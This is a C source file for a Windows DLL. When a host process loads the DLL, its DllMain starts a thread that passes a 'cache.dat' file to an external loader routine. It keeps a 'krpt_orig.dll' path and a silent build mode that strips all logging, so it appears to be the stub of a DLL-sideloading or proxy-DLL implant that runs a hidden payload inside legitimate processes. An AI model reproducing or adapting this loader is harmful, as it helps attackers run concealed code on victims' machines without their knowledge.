#include <windows.h>
#ifndef PROFILE_ONLY_SILENT
#include <stdio.h>
#endif
#include <string.h>

extern int dhpl_loader_main(int argc, char** argv);

static HINSTANCE g_hinst = NULL;
static volatile LONG g_agent_started = 0;
static HANDLE g_agent_thread = NULL;
static char g_dll_path[MAX_PATH * 2];
static char g_dir_path[MAX_PATH * 2];
#ifndef PROFILE_ONLY_SILENT
static char g_log_path[MAX_PATH * 2];
#endif
static char g_cache_path[MAX_PATH * 2];
#ifndef PROFILE_ONLY_SILENT
static char g_loader_log_path[MAX_PATH * 2];
static char g_real_path[MAX_PATH * 2];
#endif

static void join_dir_leaf(char* out, size_t out_size, const char* dir, const char* leaf, const char* fallback)
{
    size_t dir_len;
    size_t leaf_len;
    if (!out || out_size == 0) return;
    out[0] = 0;
    if (!dir || !leaf) {
        if (fallback) lstrcpynA(out, fallback, (int)out_size);
        return;
    }
    dir_len = strlen(dir);
    leaf_len = strlen(leaf);
    if (dir_len + leaf_len + 1 > out_size) {
        if (fallback) lstrcpynA(out, fallback, (int)out_size);
        return;
    }
    memcpy(out, dir, dir_len);
    memcpy(out + dir_len, leaf, leaf_len + 1);
}

static void init_paths(void)
{
    DWORD n;
    int i;
#ifndef PROFILE_ONLY_SILENT
    char leaf[96];
#endif

    if (g_dll_path[0]) {
        return;
    }

    n = GetModuleFileNameA(g_hinst, g_dll_path, (DWORD)sizeof(g_dll_path));
    if (!n || n >= (DWORD)sizeof(g_dll_path)) {
        lstrcpynA(g_dll_path, "C:\\Users\\Public\\krpt.dll", (int)sizeof(g_dll_path));
    } else {
        g_dll_path[n] = 0;
    }

    lstrcpynA(g_dir_path, g_dll_path, (int)sizeof(g_dir_path));
    for (i = (int)lstrlenA(g_dir_path) - 1; i >= 0; i--) {
        if (g_dir_path[i] == '\\' || g_dir_path[i] == '/') {
            g_dir_path[i + 1] = 0;
            break;
        }
    }
    if (i < 0) {
        lstrcpynA(g_dir_path, "C:\\Users\\Public\\", (int)sizeof(g_dir_path));
    }

    join_dir_leaf(g_cache_path, sizeof(g_cache_path), g_dir_path, "cache.dat",
                  "C:\\Users\\Public\\cache.dat");
#ifndef PROFILE_ONLY_SILENT
    join_dir_leaf(g_log_path, sizeof(g_log_path), g_dir_path, "krpt.agent.log",
                  "C:\\Users\\Public\\krpt.agent.log");
    snprintf(leaf, sizeof(leaf), "krpt-loader-diag-%lu.log", (unsigned long)GetCurrentProcessId());
    join_dir_leaf(g_loader_log_path, sizeof(g_loader_log_path), g_dir_path, leaf,
                  "C:\\Users\\Public\\krpt-loader-diag.log");
    join_dir_leaf(g_real_path, sizeof(g_real_path), g_dir_path, "krpt_orig.dll",
                  "C:\\Users\\Public\\krpt_orig.dll");
#endif
}

#ifndef PROFILE_ONLY_SILENT
static void append_log(const char* event_text)
{
    FILE* f;
    SYSTEMTIME st;
    char host_path[MAX_PATH * 2];
    DWORD hn;
    DWORD real_attr;
    DWORD cache_attr;

    init_paths();

    f = fopen(g_log_path, "ab");
    if (!f) {
        return;
    }

    GetLocalTime(&st);
    hn = GetModuleFileNameA(NULL, host_path, (DWORD)sizeof(host_path));
    real_attr = GetFileAttributesA(g_real_path);
    cache_attr = GetFileAttributesA(g_cache_path);
    if (!hn || hn >= (DWORD)sizeof(host_path)) host_path[0] = 0;

    fprintf(f,
            "%04u-%02u-%02u %02u:%02u:%02u AGENT %s pid=%lu tid=%lu host=%s dll=%s real=%s real_exists=%s cache=%s cache_exists=%s cmd=%s\n",
            st.wYear, st.wMonth, st.wDay,
            st.wHour, st.wMinute, st.wSecond,
            event_text ? event_text : "(null)",
            (unsigned long)GetCurrentProcessId(),
            (unsigned long)GetCurrentThreadId(),
            host_path,
            g_dll_path,
            g_real_path,
            (real_attr == INVALID_FILE_ATTRIBUTES) ? "False" : "True",
            g_cache_path,
            (cache_attr == INVALID_FILE_ATTRIBUTES) ? "False" : "True",
            GetCommandLineA());
    fclose(f);
}
#else
#define append_log(event_text) ((void)0)
#endif

static DWORD WINAPI agent_loader_thread(LPVOID param)
{
    char arg0[] = "krpt.dll";
#ifndef PROFILE_ONLY_SILENT
    char* argv[5];
#else
    char* argv[3];
#endif
    int rc;
    (void)param;

    init_paths();
    append_log("AGENT_THREAD_ENTER");
    Sleep(100);
    append_log("AGENT_THREAD_POST_SLEEP");

    argv[0] = arg0;
    argv[1] = g_cache_path;
#ifndef PROFILE_ONLY_SILENT
    argv[2] = NULL;
    argv[3] = g_loader_log_path;
    argv[4] = NULL;

    if (SetEnvironmentVariableA("MMPP_LOADER_LOG", g_loader_log_path)) {
        append_log("AGENT_THREAD_SETENV_MMPP_LOADER_LOG_OK");
    } else {
        char line[128];
        snprintf(line, sizeof(line), "AGENT_THREAD_SETENV_MMPP_LOADER_LOG_FAIL gle=%lu",
                 (unsigned long)GetLastError());
        append_log(line);
    }

    append_log("AGENT_THREAD_BEGIN");
    rc = dhpl_loader_main(4, argv);
    {
        char line[128];
        snprintf(line, sizeof(line), "AGENT_THREAD_RETURNED rc=%d", rc);
        append_log(line);
    }
#else
    argv[2] = NULL;
    rc = dhpl_loader_main(2, argv);
#endif
    return (DWORD)rc;
}

static void start_agent_once(void)
{
    HANDLE h;

    if (InterlockedCompareExchange(&g_agent_started, 1, 0) != 0) {
        append_log("AGENT_ALREADY_STARTED");
        return;
    }

    h = CreateThread(NULL, 0, agent_loader_thread, NULL, 0, NULL);
    if (!h) {
#ifndef PROFILE_ONLY_SILENT
        char line[128];
        snprintf(line, sizeof(line), "AGENT_THREAD_CREATE_FAILED gle=%lu", (unsigned long)GetLastError());
        append_log(line);
#endif
        InterlockedExchange(&g_agent_started, 0);
        return;
    }

    g_agent_thread = h;
    append_log("AGENT_THREAD_CREATED");
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        g_hinst = hinst;
        DisableThreadLibraryCalls(hinst);
        init_paths();
        append_log("DLL_PROCESS_ATTACH");
        start_agent_once();
    } else if (reason == DLL_PROCESS_DETACH) {
        append_log("DLL_PROCESS_DETACH");
        if (g_agent_thread) {
            CloseHandle(g_agent_thread);
            g_agent_thread = NULL;
        }
    }
    return TRUE;
}
